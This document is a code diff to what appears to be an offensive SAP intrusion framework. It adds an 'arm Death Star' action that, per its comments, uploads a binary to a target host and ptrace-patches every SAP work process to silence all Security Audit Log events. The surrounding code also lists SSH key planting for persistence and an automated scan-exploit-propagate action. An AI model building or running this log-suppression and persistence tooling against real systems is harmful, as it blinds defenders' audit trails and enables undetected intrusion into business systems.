@@ -79,6 +79,8 @@ Supported actions:
     check_all_snc, check_all_vulns,
     # State management
     save_state, load_state,
+    # Tier 3 evasion (--allow-evasion + --confirm required)
+    tier3_arm_death_star, tier3_disarm_death_star,
     # Macros (expanded at load time into multiple sub-steps)
     java_pipeline
 """
@@ -959,6 +961,36 @@ def _map_step(step: dict) -> tuple:
         return ("POST", "/api/actions/check_all_vulns", {}, True)
 
     # -----------------------------------------------------------------
+    # Tier 3 evasion — Virtual SAP Death Star (ptrace SAL suppressor)
+    # -----------------------------------------------------------------
+    # Requires the SAPMAP session to have been started with
+    # --allow-evasion.  The arm step deploys Julian Petersohn's
+    # sap_audit_hook.linux-x86_64 to /tmp on the target and
+    # PTRACE_ATTACHes to every disp+work worker — clearly destructive,
+    # so tier3_arm_death_star is in DESTRUCTIVE_ACTIONS (needs
+    # --confirm on the CLI).  Disarm restores the INT3 bytes and
+    # detaches — safe to run always.
+    if action == "tier3_arm_death_star":
+        return ("POST",
+                 f"/api/node/{target}/tier3_sal_death_star_launch", {
+            # Empty filter_classes → suppress ALL event classes
+            # (matches the GUI's "leave field empty" behavior).
+            "filter_classes": step.get("filter_classes", ""),
+            # Optional operator-supplied PID.  Empty / omitted → let
+            # the C hook auto-attach to every work-process (the
+            # normal case).
+            "target_pid": step.get("target_pid", ""),
+            "skip_upload": bool(step.get("skip_upload", False)),
+            "skip_compile": bool(step.get("skip_compile", False)),
+            "verbose": bool(step.get("verbose", True)),
+        }, True)
+
+    if action == "tier3_disarm_death_star":
+        return ("POST",
+                 f"/api/node/{target}/tier3_sal_death_star_stop",
+                 {}, True)
+
+    # -----------------------------------------------------------------
     # State management
     # -----------------------------------------------------------------
     if action == "save_state":
@@ -1054,6 +1086,7 @@ DESTRUCTIVE_ACTIONS = {
     "ssh_plant_key",          # writes authorized_keys — persistence marker
     "import_transport",       # STMS transport import (only dry_run is safe)
     "autopwn",                # full scan → exploit → propagate loop
+    "tier3_arm_death_star",   # writes 91 KB binary, ptrace-patches disp+work text
 }
 
 
@@ -1208,6 +1241,9 @@ _ACTION_LABELS = {
     "check_all_router_info":      "Sweeping SAProuter info leak",
     "check_all_snc":              "Sweeping SNC config",
     "check_all_vulns":            "Sweeping every vuln check",
+    # Tier 3 evasion
+    "tier3_arm_death_star":       "Tier 3: arming Death Star",
+    "tier3_disarm_death_star":    "Tier 3: disarming Death Star",
     # State
     "save_state":                 "Saving session state",
     "load_state":                 "Loading session state",
